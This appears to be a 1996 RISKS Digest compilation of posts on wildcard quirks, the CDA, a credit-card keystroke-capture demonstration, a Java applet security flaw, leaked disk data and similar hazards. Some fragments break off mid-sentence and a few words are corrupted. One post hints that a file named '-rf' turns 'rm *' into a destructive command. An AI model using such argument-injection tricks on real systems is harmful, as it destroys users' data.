the taskbar the screen saver would not come up, even though it is not
fullscreen, or if this is a bug.  My advice: Make sure the program on the
taskbar is a windows app. or nothing at all is "depressed".

ETHICOMP96<BR>
The Third International Conference on
Ethical Issues of Information Technology
<P>
Hosted by Facultad de Informatica, Universidad Pontificia de Salamanca en
Madrid, in association with Centre for Computing and Social Responsibility,
De Montfort University, UK and Research Center on Computing and Society,
Southern Connecticut State University, USA
<P>
Preliminary Notice and Call for Papers<BR>
Two international conferences have been held which address the social and
ethical issues surrounding the world of computing. The first was in the USA
at Southern Connecticut State University (NCCV91) and the second
(ETHICOMP95) was at De Montfort University in the UK.  Both conferences have
been recognised as milestone events.  In order to sustain momentum and
advance resulting research, a third conference ETHICOMP96 is to be held in
Madrid. The intention is to bring together international scholars to
consider current and future developments of IT and resulting social and
ethical issues. Madrid is an ideal location for this conference, being a
major European capital with a high cultural, academic and commercial
reputation.
<P>
The overall theme of ETHICOMP96 will be the value of IT to society and the
likely impacts upon society's values. The intention is to include papers
which provide practical guidance on socially and ethically sensitive
applications of IT -- the social benefits and drawbacks of using IT. In
parallel to this will be the presentation of case studies which raise or
illustrate significant ethical problems of IT usage (1) in the workplace,
(2) in education, (3) at home and (4) in leisure. Papers and case studies
are invited from relevant disciplines such as philosophy, computer science,
information systems, law, social sciences, business and government.  Papers
and case studies with a multi-disciplinary perspective are particularly
welcome.

<P>
&gt;... This is receiving, not transmitting.
<P>
For the purposes of the law, "transmission" means "sending of data", more or
less.  Your http server is "transmitting" the info to the visitor's browser.
<P>
&gt;I know this is semantics at this point;
<P>
Beware the difference between common-parlance semantic differences and legal
terms-of-art semantic differences.  In common parlance, "obscenity" isn't as
bas as "indecency" to many people, since a "swear-word" is an "obscenity".
Legally, it's not an obscenity, but an indecency, and obscenity is more
stringently proscribed than indecency.  The understandable lack of knowledge
of legal terms of art (don't feel bad - a lot of lawyers don't know the
difference between obscenity and indecency) is the primary means by which
the fundamentalist groups behind the CDA have managed to increase supposed
public support of it. They perpetually uses the terms interchangeably, and
then suggest that the CDA will prevent the "exploitation of children" ( -
Cathy Cleaver debating Jerry Berman on tv the other day).
<P>
To state it as a RISK:  It is easy for fundamentalist groups to gain
more acceptance of the idea of censoring online communications, by combining
loaded terms that imply something else ("exploitation of children" is
very emotional a phrase, and implies child pornography, rape and abuse -
subjects not in any way relevant to the CDA) with confused terms that
most of the public didn't have a legal understanding of even before the
confusion was introduced (e.g. "indecency", "obscenity" and
"pornography", which is legally a synonym of "obscenity" as are "harmful
to minors" and, as far as we can tell, "patently offensive".)

<P>
After I saw D'Oliveiro's notes (see below) on the "?" wildcard and its use
within Win95, I did some testing with Visual Basic 3.0, Visual Basic 4.0,
Access 2.0, and Access 7.0 (aka Access 95). The KILL statement (used to
delete a disk file) is implemented in three different ways!
<P>
Start with 6 files in a directory (mine was C:\TEMP): TEST9.TXT,
TEST91.TXT, TEST92.TXT, TEST931.TXT,TEST932.TXT, and TEST.TXT.
<P>
VB 4.0 and Access 7.0 using KILL "C:\TEMP\TEST9?.TXT" will delete two files:
TEST91.TXT and TEST92.TXT.<BR>
VB 3.0 using KILL "C:\TEMP\TEST9?.TXT" will delete three
files: TEST91.TXT, TEST92.TXT, and TEST9.TXT.<BR>
Access 2.0 using KILL "C:\TEMP\TEST9?.TXT" will delete two files: TEST.TXT,
and TEST9.TXT. (I don't understand this one!)
<P>
I could not find any note of the differences in the help files or the
Developer Network CD (Jan 96). So it is left up to your user to find out!
<P>
Isn't this a RISK where deleting a file from code has a different effect
when you switch versions? It really demonstrates that you can't trust
converted code, you still have to test each and every feature.

<P>
I just read something disturbing in PC Magazine, which I have verified is
true. In Windows 95, the "?" wildcard is treated inconsistently in file
specifications: sometimes it means "exactly one character", and other times
it means "at most one character".
<P>
Suppose you have a directory with two files in it, one named XX and one
named XXX. The command "DIR XX?" will only show the second file, but "DEL
XX?"  will delete both files!
<P>
One dependable rule in every computer system I have ever used prior to this,
is that a wildcard specification will always expand to the same set of
filenames, regardless of what command you use it in. Wind95 not only breaks
this rule, it breaks it in the worst way: the "delete" command, given the
same wildcard specification, will delete a larger set of files than the less
harmful "directory" command will display! This means you can no longer use
the technique of checking a wildcard specification with DIR to make sure it
will only affect the right files, before letting it loose with DEL.

<P>
An interesting technicality in the discussion of inconsistent wildcard
expansion in Windows 95.
<P>
In MS-DOS the DIR and DEL commands are not programs, the are "internal
commands" which are processed by the command interpreter (COMMAND.COM).  I
don't have a copy of Windows 95 handy, but I would assume that this is still
the case.
<P>
Thus we do not have a case of different programs interpreting wildcards
differently, but the same program (the command interpreter) interpreting
them differently in a different context.

<P>
In 17.75, Otto Stolz points out that the UNIX 'ls' command will list
more files than the 'rm' command would remove if (shell-globbed) wildcards
are used:
ls x*<BR>
lists all files, directories, _and the contents_ of directories beginning
with the character 'x', while<BR>
rm x*<BR>
will remove only files beginning with 'x' (not directories).
<P>
There is an important issue at work here: That universal wildcard expansion
(as is done under the UNIX shell) does not equivale universal argument
interpretation. 'ls' and 'rm' interpret their arguments in very different
ways; 'rm' won't delete directories, and 'ls' lists the contents of
directories. (ls -d could be used to circumvent the second of these).
<P>
While this may be obvious, I think it's important to point out that
pre-globbed wildcards simply produce a list of words as command-line
arguments; this in no way implies that the program using those arguments
should interpret them in a particular way.
<P>
This can be exploited in both good and bad ways; for example, if a directory
were to contain a file named '-i', then 'rm *' in that directory would
expand to 'rm -i ....' (assuming '-i' is the first expanded filename in
the wildcard). The -i switch to rm forces interactive mode where the user
must answer 'y' or 'n' to delete each file. I know some people use this to
'protect' certain directories from accidental 'rm *'.
<P>
However, one could also create a file named '-rf'... This exercise is left
to the reader.
<P>
Don't be fooled: UNIX syntax is in no way based on hard rules---conventions
are the dominating factor. Needless to say there's also no guarantee that
a particular shell expands the '*' and '?' wildcards as one would normally
expect. The various tradeoffs here have to do with where the conventions
are embodied: In Win32 systems, they are within the application itself;
under UNIX, they are generally within the shell. Which would you rather
have---'invisible' (and unalterable) semantics within each particular
application or 'treatable' semantics enforced by your shell (and applied to
all applications)?
<P>
The RISK here has to do with software conventions and non-obvious behavior
of (apparently) mundane software. Conventions such as these permeate
UNIX, and I know more than one UNIX neophyte who has been bitten by them.

<P>
I'd like to make a few clarifications about the FV credit card attack
demonstration program, as there have been a few misunderstandings in the
way it was described on RISKS.  At the moderator's request, I'm keeping
this as short as possible; full details are at
<A HREF="http://www.fv.com/ccdanger">http://www.fv.com/ccdanger</A>, or by personal mail.
<UL>
<LI>Our "overstated" claims were overstated by those who described them.<BR>
We do not claim that there's no possible technical defenses; in fact, we
enumerate several such defenses, and also outline four broad classes of
commerce systems that do not have this flaw, only one of which is our
own.  I do apologize for some probably-misleading wording, however.
<P>
<LI>It is true that the threat goes beyond commerce mechanisms.  If word
processor vendors were telling the world "everyone should type credit
card numbers into word processors" we would probably have focused on
word processors, too.
<P>
<LI>Antiviral and other prophylactic software can only protect against
the LAST attack of this kind, not the next one.  The infection vector
can be a socially-engineered Trojan Horse, and once installed the
program does nothing that categorically distinguishes it from a screen
saver or keyboard accelerator.
<P>
<LI>The complexity of our attack has been overstated.  Credit card
numbers can be recognized with about 8 lines of C code.  My favorite
approach to the traceless dissemination of the data can be done in about
20 lines of C code.  The hardest part is the installation and the actual
keystroke interception!  The DLL for our current Windows implementation
is under 16K.
<P>
<LI>It is true that the most likely detection would be by the sheer
volume of traffic on the back-channel, but there are also simple
traffic-gating techniques.  And users should never get errors back from
a well-implemented distribution channel.
<P>
<LI>Address verification isn't the answer.  It can be very effective in
preventing a certain class of *uses* of stolen credit card numbers, but
there are many other ways to use such numbers, especially for
terrorism/vandalism.
<P>
<LI>Current credit card fraud detection is inadequate.  Nearly all of the
traditional fraud detection mechanisms are based on pattern analysis,
and the criminals typically get nabbed after repeated uses of the same
stolen card number.  This is not very helpful against an attack that
yielded enough card numbers to treat them as one-time tokens.
<P>
<LI>My most serious disagreement with Olin Sibert is on the question of
the easy infiltration of home machines.  Up to now, there has been no
motivation for serious criminals (organized crime, terrorists) to build
malicious computer programs.  Organized crime and terrorist groups have
both the means and, in a future of Internet commerce, the motivation to
mount such an attack.  A sufficiently unsophisticated user can easily be
tricked into downloading and running a malicious program.  The essence
of the FV attack on credit card numbers is statistical; we don't need to
infect the machines of the most sophisticated users, as long as we can
infect a lot of unsophisticated users' machines.
<P>
<LI><EM>The true and neglected underlying risk</EM> is that of system security
being compromised by unsophisticated end-users.  Today, we live in an
Internet where people consider "cut and paste" a technical term, and
where users complain of getting so lost in a web site that they have no
way of escape other than rebooting their machine.  (Yes, these are both
based on real customer service incidents at First Virtual.)  The
permanent insecurity of the consumer platform is an under-appreciated
reality of 1996.  The bottom line:  a commerce mechanism that presumes
that the consumer's machine has not been compromised is a commerce
mechanism that will be easily defeated on the bulk of consumers'
machines.
</UL>
I hope these clarifications shed some light on what FV is and is not
claiming about the risks of credit cards on the Internet.  I think
there's a very serious set of risks here, and I hope that those risks
haven't been overshadowed, in the technical community, by the confusion
that comes from trying to alert the wider population to the fact that
such risks exist.  If I'm right, then the first symptom the banks are
going to have of such an attack will be an increase in the overall rate
of credit card fraud, with NO evidence linking this phenomenon back to
the Internet.  I think that's a huge potential risk.

I think the response above from First Virtual is sufficiently laden with
concessions to show the debate for what it really is: a difference of
opinion over the importance of various unmeasurable factors, such as:
<UL>
<LI>The likely competence (or lack thereof) of potential attackers;
<P>
<LI>The difficulty of translating laboratory prototype software into a
secret, widely-distributed, error-free, mass-market consumer product;
<P>
<LI>The ease with which stolen credit card numbers can be turned into
value for an attacker (and risks posed by such activity);
<P>
<LI>The availability and effectiveness of all types of counter-measures
(the dismissal of prophylactic software is arguably unimaginative);
<P>
<LI>The effectiveness of existing fraud-detection measures;
... and so forth.
</UL>
If we make assumptions at one end of the scale, society could collapse
in a fortnight.  Under other assumptions, nothing much happens.  Much
depends on those assumptions--and the real RISK is that a one-sided
presentation can alarm without educating.

<P>
Although the investigation is far from complete, some facts that have come
to light (see *The New York Times*, 19 Feb 1996) point to the role of total
system design for safety.
<P>
The event recorder aboard the MARC train shows that the train was going
twice as fast as it should have been, just prior to the crash.  Why was
this?  The train passed a yellow signal, which should have told the engineer
to slow down.  But the signal was *before* a station; there is speculation
that during the station stop, the engineer forgot what the signal read, and
just accelerated to normal track speed.  (N.B.  Investigators have not yet
determined if that signal was truly yellow, or if it changed to yellow while
the train was in the station; these factors would obviously change the
hypothesis given here.)
<P>
The interesting part is that the signal used to be after the station,
as is common on passenger lines, precisely to avoid that problem.
But it was moved a few years ago to increase the passenger train
capacity of the line, which is primarily used for freight trains.
Signal spacing is correlated with the maximum speed and weight of
the trains; to increase speed, one should space the signals further
apart and/or add more signals.  (A recent New York subway accident
occurred because this was not done as the rolling stock changed.)
<P>
Numerous factors apparently interacted to cause this accident:
<UL>
<LI>The line was used for both freight and passenger trains;
these have different characteristics (weight, frequency,
length of train, signal conventions).
<P>
<LI>Simply adding a repeater for the misplaced signal might
have caused operational problems -- the rules on that line
require engineers to radio an acknowledgement each time
they pass a signal.  Another signal means more radio traffic.
(The crew of the MARC train did make the required report,
but the witnesses don't remember what signal aspect they
reported.  Investigators are searching for audio tapes now.)
<P>
<LI>The line was set up for Centralized Traffic Control (CTC),
permitting bidirectional operation on both tracks.  That
provides flexibility -- it let the Amtrak train use to
left-hand track to pass a stopped freight train -- but at
the cost of complexity.  But it also led to the crash,
which happened as the Amtrak train was about to switch back
to the right-hand track.  (Btw -- it's worth noting that
CTC is not a new system; according to the references I have
on hand, it became economically feasible as early as 1930.
``Interlocking'' -- tying signals to switch track positions
-- may date to as early as 1857.)
<P>
<LI>Train signals are normally set up so that only one train<BR>
at a time can be in a ``block''.  If you want a lot of
trains on a line, you need short blocks, but that also
means you need more complex signal indications to tell the
engineer when to slow down to prepare for a red signal
several blocks ahead.  This in turn puts more demand on
both the engineer and the signaling logic (though the
latter, at least, does not seem to be implicated here).
<P>
<LI>Automatic train control equipment, which regulates the speed<BR>
of trains per the signal equipment, would have helped, but
such equipment is rare in the U.S.  (Again, this is not new
technology; the Federal rule limiting track speeds to 79 mph
in the absence of such gear dates to 1951.)  Why wasn't it
used?  Well, it's expensive, commuter lines often don't run
that fast anyway, because of their frequent stops, and this
is primarily a freight line.  (MARC paid CSX (the freight line)
for one signal system upgrade in 1993.)
<P>
<LI>If the problem is indeed the placement of the signal before the<BR>
station, cab signals (vintage: 1921) would have helped.  Again,
though, this is expensive equipment.  The newspaper article was
silent on this point.
<P>
<LI>If any of the equipment I mention here had been used, the cost<BR>
would have been greater complexity, which in and of itself
increases the likelihood of failure (though I should note that
railroads have a pretty good record of using fail-safe or
fail-soft equipment -- automatic block signaling wasn't adopted
until a fail-safe design was developed).
</UL>
Though computers were apparently not involved in this accident, the lesson
is the same:  many failures are caused by complex interactions.  There is
rarely a single cause.

Even worse than errant squirrels ...
<P>
------- Forwarded Message (from a colleague)
<P>
I'd like to apologize if you've had trouble contacting me recently.  What
the floods here in Oregon were unable to do, a cowboy garbage truck driver
made up for.  It seems that they have this little game they like to play on
the way back into town after dumping their load called "swing the cables".
They raise the forks (used to lift the dumpsters up over the truck to empty
it into the back) to try to flick the big thick telephone cables stretched
across the highway.  One guy overdid it and ripped out the cable for service
to the entire west side of the telephone central office that serves my home
and office.  It took a lot of work to put that cable back into service
considering that it was shredded where it was torn from the shattered
telephone poles on both sides of the highway. Meanwhile, five lanes of
traffic were driving over the fallen corpse.  As I write this the telephone
guys are still up there in their little tents, high above the ground,
huddled against the rain, slowly splicing it all back together.
<P>
As a work-around I had the telephone company forward all calls to my
cellular phone but somebody made a typographical error setting it up and by
calls got forwarded to Timbuktu instead of to my cell phone.  Furthermore, I
hadn't seen any need to equip my cell phone with FAX or modem so I was
FAX-blind and isolated from my e-mail and other internet access.
<P>
So, if I haven't responded to something that you've sent me or you have been
unable to FAX me, please try again now.

<P>
If I were going to censor anything about the WWW it would be the use,
by those of us who should know better, of the term "publish" to
describe the act of making data available from a server.
<P>
I think much trouble comes from using this unfortunate word.
Most people do not understand that surfing the net is much more like
placing 'phone calls than reading a magazine found lying on a chair.
We have confused the public debate by using the term "publish" because
it connotes, to virtually all non-computer-geeks, communication
through materials which can be sent or delivered to people who have
not requested them.
<P>
All public discussions of the censorship issue have included
statements, sometimes maliciously uttered by activists who know
better, but more often repeated by the ignorant, to the effect that
evil people will send undesirable images or words to children.
Magazines may be mailed to non-subscribers; but only computer geeks
know that the images on the web-browser's screen appear only when the
user calls for them.
<P>
The word "broadcast" is even worse.  The mere invocation of this word
has been claimed to justify censorship precisely because it connotes
the possibility of unsolicited delivery.
<P>
When we use the terms "publish" or "broadcast" we invite the public
to misunderstand the 'net.  Even when some of us, with the best of
motives, demand to be treated "as publishers legally" the effect is
to shoot ourselves in the foot.  Publishers are required to register
with the government, for goodness' sake.  The correct legal treatment
to request is that accorded private citizens speaking freely to
anonymous telephone callers!  Links to other folks' pages are akin
to giving out a 'phone number--no one who does so should be thought
responsible for any message which may be heard by calling it.

Adobe Acrobat 2.1 on the Mac _quietly_ drops text for which it lacks
TrueType fonts.  In particular, if your Mac has bitmap fonts for the 'Times'
fonts, but no scalable TrueType fonts, then Acrobat 2.1 doesn't bother
displaying text in the 'Times' fonts at all.  This lossage is particularly
curious, since Acrobat has a very sophisticated font-substitution capability
using its 'generic' serif and sans-serif fonts for more obscure fonts.
<P>
Even more curious is the fact that on Adobe's own technical notes on
ftp.adobe.com, the following text _will not be displayed_ if your 'Times'
fonts are missing:
<P>
"...Adobe Systems Incorporated assumes no responsibility or liability for
any errors or inaccuracies, makes no warranty of any kind (express, implied
or statutory) with respect to this publication, and expressly disclaims any

<P>
If this text is missing from Adobe's _own_ documents, then such disclaimer
text could well be missing from _every_ document, whether from Adobe or some
third party, if this disclaimer is set in one of the 'Times' fonts.
<P>
Since many important manuals and forms -- including IRS tax forms and many
state tax forms -- are now being distributed in 'PDF' (Acrobat) format, the
risks should be obvious.

We have discovered a serious security problem with Netscape Navigator's 2.0
Java implementation.  (The problem is also present in the 1.0 release of the
Java Development Kit from Sun.)  An applet is normally allowed to connect
only to the host from which it was loaded.  However, this restriction is not
properly enforced.  A malicious applet can open a connection to an arbitrary
host on the Internet.  At this point, bugs in any TCP/IP-based network
service can be exploited.  We have implemented (as a proof of concept) an
exploitation of an old sendmail bug.
<P>
If the user viewing the applet is behind a firewall, this attack can
be used against any other machine behind the same firewall.  The
firewall will fail to defend against attacks on internal networks,
because the attack originates behind the firewall.
<P>
The immediate fix for this problem is to disable Java from Netscape's
"Security Preferences" dialog.  An HTTP proxy server could also
disable Java applets by refusing to fetch Java ".class" files.  We've
sent a more detailed description of this bug to CERT, Sun, and
Netscape.
<P>
A second, also serious, bug exists in javap, the bytecode
disassembler.  An overly long method name can overflow a stack
allocated buffer, potentially causing arbitrary native code to be
executed.  The problem is an unchecked sprintf() call, just like the
syslog(3) problem last year.  Many such bugs were in the alpha 3
release's runtime, but were carefully fixed in the beta release.  The
disassembler bug apparently slipped through.  This attack only works
on users who disassemble applets.  The fix is to not run javap until
Sun releases a patch.
<P>
Note that we've only had success in exploiting the first flaw on an SGI.
Windows 95 and DEC Alpha versions of Netscape have other bugs in their
socket implementations that make it harder (although not necessarily
impossible) to exploit the problem.  This is the second time that unrelated
implementation bugs have prevented us from demonstrating security problems
in Java.

The 5:00PM news broadcast on a local channel here in the Denver area ended
with a story on how the news anchors were a bit worried that they would not
be able to deliver the news that evening.
<P>
It seems that someone on the news staff had locked everyone out of the
system used to write-up the "copy".
<P>
The news anchor went on to say that if you are not careful while typing in
your name, and that your last name is "Lockheart", you might cause your
fellow workers some anxiety.
<P>
The usual "humorous anecdote anchor laugh" followed.
<P>
The obvious risks:
<UL>
<LI>Be careful of the passwords you pick, especially where
your "average" user has the potential to cause harm (that
"!&amp;wjl186" password is starting to look good...)
<P>
<LI>Don't let your "talking heads" blurt out what is in effect
your systems root password over the air.
</UL>
I just hope that the system administrators changed the password,
if not before the anchors gaffe then at least afterword.

Speaking of problems with filename globbing and the conventions on different
systems, I found out about encrypted files under DR DOS the hard way a few
years back.
<P>
I was trying to use sz to download several files from a VMS system to my PC,
on which I was newly using DR DOS. The VMS version of sz wouldn't allow wild
cards at all, so I issued a DIR command, saved the results in a file, then
used this file as input to a DCL command file to invoke sz. For those who
aren't familiar, VMS associates a version number with each file, as in
FOO.BAR;1
<P>
I'd never had any problems with VMS to MS DOS file name conversion before -
MS DOS just ignored the ;1 so I didn't pay any attention.
<P>
All my files downloaded just fine, but I couldn't access them. The file names
all looked right, but DR DOS kept telling me the files were password protected.
After several frustrating minutes of scrounging through the manuals, I found
that DR DOS uses the ";xxxxxx" syntax to specify a password to be associated
with a file. Sure enough, all my files had a password of "1","2", or "3".
<P>
It was hard learning to use a semicolon properly in writing class but I didn't
expect it to be that tricky in computing as well ;)

the program simply acquires x blocks of disk space, but doesn't zero them
t(out before using them.  This way, gaps in the file or at the end are
occupied by old data from the disk.  (In your case, probably a piece of your
w{b-browser's history list).  Of course, it is also a file-system problem,
in that data is not zeroed-out when a disk block is freed.
<P>
A similar discovery around 6-7 years ago nearly torpedoed Prodigy
(whether this would have been a good thing is open to debate. :).  In a
perfectly sensible manner, Prodigy created a cache file on the disk.  The
program grabbed a fairly large amount of space for this file, although it
did not fill up right away.  Somebody looking through this file discovered
bits and pieces of their own data, and rumors flew from there.
<P>
I personally believe that this is a MUCH more severe problem then is
commonly realized.  Most file-systems do not overwrite old data, then many
programs compound this flaw by simply grab space.  I think the risks are
obvious, especially in a multi-user environment.  E.G., one could
conceivably write a program to grab a block on disk, search through them for
interesting data (eg the public key a security paranoid uses for his e-mail,
which happened to get swapped out to disk for a moment), mark the block as
read, and then free it.  Or who knows what interesting tidbits may have
inadvertently found their way into major ftp archives (now available on
CD-Rom).

&gt;If Joe Klein, a well-known political writer, is indeed the author, it is<BR>

On the other hand, if Joe Klein is *not* the author, then it is clear

&gt;The following type of example should be borne in mind when comparing safety<BR>
&gt;propaganda and safety spending with "common sense solutions": Asthma is<BR>
&gt;generally reckoned to be a disease caused by vehicle pollution: In the UK<BR>
&gt;last year 4m pounds was spent on asthma research 6m pounds was spent on<BR>
&gt;POLICING demonstrations against the proposed new M11 road.
<P>
Maybe this type of statement is the "Glaring Light" to show the problems
with "The Measurement of Risk".  People who have Asthma may be sensitive to
vehicle pollution, but Asthma existed long before the invention of the
automobile. And people with Asthma are often sensitive to lots of other
air borne items besides vehicle pollution, such as pollen, dander, etc.
<P>
So, Phillip, gives us a perfect example of a statement designed to enrage
and scare people to get more funding for his "pet disease". (And villify,
a technological item that he disagrees with, motor vehicles.)
<P>
&gt;As for Telstra's radio emissions, well, I suppose...it was the technical<BR>
&gt;world telling them that radioactivity was good for you...
<P>
The UK must be a really strange place, I don't remember hearing this in the US.
Even the old 50's movies show that exposure to radioactivity would create,
"The Amazing Colosso Man" or "The Incredible Shrinking Woman".

The following thread is developing in misc.transport.air-industry.  Quite
frankly I have stopped reading the group because in the desire to engage in
enlightened discourse with other reasonable minds, the unreasonableness of
the legal system intrudes.
<P>
I see the risk as:  Any communication by an individual using a company
domain name is legally perceived as being a representative of that company
without regards to any efforts to distance the user from the provider.
<P>
I know of at least one case where this was true, and while the individual
included a disclaimer, the inclusion of the disclaimer was itself construed
as meaning that the individual was attempting to speak for the company.
Until this is actually tried in court, I think that the safe assumption has
to be that anything you say can, and will, be used against you.

here.  All misc.transport.air-industry moderators have received a
copy of this message, and know who the author is.  We can tell you
the author is a long-time contributor to the newsgroup, not given to
extreme opinions, but we will not identify the author further for
obvious reasons.  We have no reason to doubt the veracity or
motivation of the author (this author has not been involved in the
debates on Airbus safety or subsidies so far as we know).
<P>
&gt;This may seem like a strange request, and I will understand if you cannot
&gt;comply with it.  Airbus Corporate Legal sent a Letter to my company's
&gt;corporate offices complaining about a posting of mine on an Internet
&gt;newsgroup.  I believe that it was this news group.  The posting was
&gt;really quite benign (it wasn't on the ever present safety issue).  It
&gt;was taken completely out of context, but that is really beside the point.
&gt;First of all, I have been asked (by my legal department) if that posting
&gt;and the entire thread is retrievable.  My guess was that it isn't, but I
&gt;told them I would ask.
&gt;
&gt;Thankfully, I work for a company which values free speech (as I do this on
&gt;my on time on my own computer), but I still find it somewhat chilling that
&gt;rather than participate in the discussion in this group; Airbus is looking
&gt;to silence people via threats to their companies.  If they are going to
&gt;come after me due to a benign third part[y] comment on performance, what
&gt;are they going to do to some of these other folks?
<P>
Obviously the moderators of misc.transport.air-industry are concerned about
any attempt at censorship of this newsgroup.  It's unclear exactly what this
group should or can do about it, and we welcome your suggestions.  We all
have an interest in keeping debate both open and lively in

If a poster has a signature file that makes reference to whom his employer
is, even if there is a "my opinions are mine and not my employers" type of
statement, and that employer has contractual ties to the plaintif (Airbus),
then I can -understand- why the plaintif would send a complaint to the
employer since one of its employees made public statements *possibly*
containing information that was obtained under non-disclosure etc.
<P>
However, no matter how slanderous a statement is posted by an individual
without any reference to an employer, there should never be any legal
retributions possible.
<P>
The issue is not of censorship but that of representation. When an employer is
mentioned, the poster is linked (like it or not, disclaimer or not) to that
company and represents it in some way. When the employer's name is posted to
give credibility to the poster, the link is all that much stronger.
<P>
So, if an individual (or his employer) has problems with another entity
(individual, corporation, government), the problem is not at the
Internet/newsgroup level and moderators should not worry.

Avoiding obviously libelous statements is almost certainly an obligation of
both posters and moderators.  But what is libel?
<P>
_Sullivan vs The New York Times_ set the standard for libel of `public<BR>
figures' in the USofA.  I suspect newsworthy corporations fall under this
umbrella ... but I have not researched this.  (Consult your favorite lawyer
for paid research :)
<P>
Three tests must ALL be passed for a statement (posting) to be libelous:
<OL>
<LI> the statement must be false.
<P>
<LI> the poster must have known the statement was false at the time he/she
made it.
<P>
<LI> the statement must have been made with malicious intent by the poster.
</OL>
With these criteria, I know of no postings in the mentioned newsgroups that
are libelous.  (Beware, standards are much more strict for non-public
figures...but this probably isn't operative in this case.)
<P>
Of course, most other countries have less protection for free speech.
But if you don't go there, they can't do anything to you :)

There's a local (Adelaide, Australia) nickname for the long-term effects of
immersion games or simulations -- it's the "Tetris Effect".  Many people,
after playing Tetris for more than an hour straight, report being plagued by
after-images of the game for up to days afterwards, an ability to play the
game in their head, and a tendency to identify everything in the world as
being made of four squares and attempt to determine "where it fits in".
<P>
Similarly, Descent players suffer from reflexes that tell them that their
car should be fitted with various weapon systems ideally suited for
educating their fellow commuters; Civilization players are known to dream
that Ghandi is demanding technology from them at threat of war; and a friend
of mine has been known to be unable to get out of bed because he's "out of
movement points".
<P>
&gt; I think the overall result, though, is that after being in VR-like (or<BR>
&gt; traditional video game) situations, the individual winds up with better<BR>
&gt; motion-perception ability.
<P>
After a long game of net-Descent I find that my visual field of
concentration is wider than usual and I "spot" more than usual, but that I
misjudge speed and placement, tend to "slide" around corners and bank my
head when I turn, and rotate my body rather than my head to see things that
aren't in front of me.
<P>
Aah, human adaptability :).  The RISK, of course, is that adaptations suited
for one environment can be downright dangerous in others...

Sending your credit card information over the Internet is really no big
deal, says Simson Garfinkel, author of a book on Pretty Good Privacy
encryption software.  "The whole thing about encryption over the Internet is
that it's not to protect the customer -- it's to protect the credit-card
companies.  By law, if there is no signature, the customer is liable for
nothing.  If there's a signature, they're liable for $50.  The reason the
credit-card companies want cryptography is to limit their own liability.  It
has nothing to do with protecting the consumer."  And although Netscape
Navigator sends a stern message each time a user attempts to send
information over the Web, Garfinkel labels the warning just another scare
tactic: "Netscape Navigator is printing those messages because they're
trying to sell encrypted servers.  It's an ad.  It doesn't look like an ad,
but it is."  (*Tampa Tribune*, 19 Feb 1996, B&amp;F3)

Hummm... Ever have the urge to sign a guest book? Reply to a silly article
in USENET or submit something off-color to a mailing list? Think again!
Every time you leave your e-mail address somewhere it is like appending "I
was at xyz at 1am in 95" to your resume, or whatever else you are applying
for. You know the drill, background checks for a job - well, what happens
when they search for your <A HREF="mailto:name/@ddress">name/@ddress</A>? Yikes! This could easily be ported
over to anything - school applications, even potential dates. Wouldn't it be
easy to add a "User Bio" button that dose a search of the web for a persons
email address when you get mail from them? The RISKs are quite apparent.

New Orleans is a strange place, and an incident on a recent flight
from there shows how strange...
<P>
When I got on my American Airlines flight home, my assigned seat was
occupied by a man who seemed strangely familiar. We checked boarding
passes and we were both assigned to the same seat.
<P>
Since the flight was almost full, the stewardess took our boarding
passes to sort out what was wrong. She came back 10 minutes later
with a strange look on her face. "Which of you is Mr. D. Crowe?" she
asked. Both of us answered "Me". Then I realized where I had seen my
seatmate before. He is not only another D. Crowe, but another David
Crowe, and also lives in Calgary. We had had lunch together once, a
while ago, due to number of misdirected phone calls and other
mistakes that had been made due to our common names.
<P>
I guess the reservations computer thought that it was being smart,
and that it was fixing the double issuance of a boarding pass!

I've just had a rather alarming experience while using Linux's "cfdisk"
program (for those that don't know, cfdisk is a disk partitioning tool, and
it is screen-oriented, requiring the use of the cursor keys).  When I tried
to move around the screen, the program didn't understand the control
sequence generated by the cursor keys on my terminal, and as one of the
characters in the sequence was the letter D, one of my partitions suddenly
disappeared.
<P>
No damage was actually caused by this (I killed the process rather than
trying to exit, as heaven knows what further attempted cursor movement would
have done), but the risks are obvious.  It seems to be common that terminals
attached to Unix systems have non-functional cursor keys, and critical
applications like disk partitioners should take note.

A year or so ago, some major accounting firm ran a half-dozen test cases
through every commercial tax preparation software they could get their hands
on -- including some aimed at professional accountants.  No two programs
gave identical results, and some of the differences were quite substantial.
After analyzing the differences, they concluded that it wasn't the software
firms' fault -- the rules were just too vague and inconsistent.  This had
always been true, but the conversion to computer programs exposed the
problems to detailed scrutiny in a way that had not previously been
possible.   [That was in RISKS a year ago.  PGN]
<P>
This prompted a columnist in some computer mag -- I forget which one -- to
propose that the IRS be required each year to release into the public domain
source code in some commonly-used high-level language that would constitute
a legally-binding algorithm for computing one's income taxes.  All you'd
have to defend in court would be the data you supplied, as the program would
be considered binding on everyone.

One more important qualifier:  only statements of fact can be considered
libel, not expressions of opinion.  Clearly there is some room for
interpretation here -- if I call my least favorite politician crazy,
I'm expressing an opinion, while if his/her psychiatrist says the
same thing it might be perceived as a medical diagnosis.

The problem described as "Risks of using Microsoft Word" probably actually
resides in the web browser being used for Thomas' cruising.  If that web
browser is storing a history of sites visited and passwords in a file, and
later deleting that file, the file's data may live on and be accessed when
another application re-uses that disk space.  Perhaps MS Word should be
initializing the disk space that it allocates, but the web browser should
probably be doing a better job of purging old data if it contains
information that needs to be secure.
<P>
A similar situation arose for me in a previous job.  A customer decided to
dump an isam-like database file to a printer.  He called our (not Tandem's)
customer service in a panic because the database file had some sort of
"high-severity failure" message in the database file.  As it turned out, the
isam database file creation utility had allocated some 4096 bytes of disk
space without writing anything to that space, and it re-used a chunk of disk
that previously contained part of a rather old defect report from our QA
department.  We altered the database file creation utility so that it would
write nulls out to the disk rather than just setting the eof.

I use a Macintosh running Word 5.1 at university. This computer is used by
many people. I have noticed that all manner of text appears in Word files
that have been edited on this computer. It seems that the text that
"appears" in the Word files are remnants of old files (seemingly other Word
files) saved on the hard drive - I do not think it was possible for the
information that I found in my documents to have been present in RAM at the
time I was editing these documents. However, if you open these documents in
Word, none of this added text is visible.
<P>
I did not think anything of this when I saw it, but it seems that it was not
an isolated problem. The RISK is obvious. What is Microsoft Word doing in
this instance?

Thomas Gebe notes that his Word files seem to contain extraneous information
that he could read quite easily in a text editor.  This isn't a new risk,
either to Risks readers (anyone here remember similar problems with
Prodigy?), or to Microsoft; last week's "Service Pack 1" for Windows 95
(<A HREF="http://www.microsoft.com/windows/software/servpak1/sphome.htm">http://www.microsoft.com/windows/software/servpak1/sphome.htm</A>) included a
fix for just this problem.  Microsoft openly admit "This could pose
information security or privacy concerns if you distribute electronic
versions of files created using these applications" ("these applications"
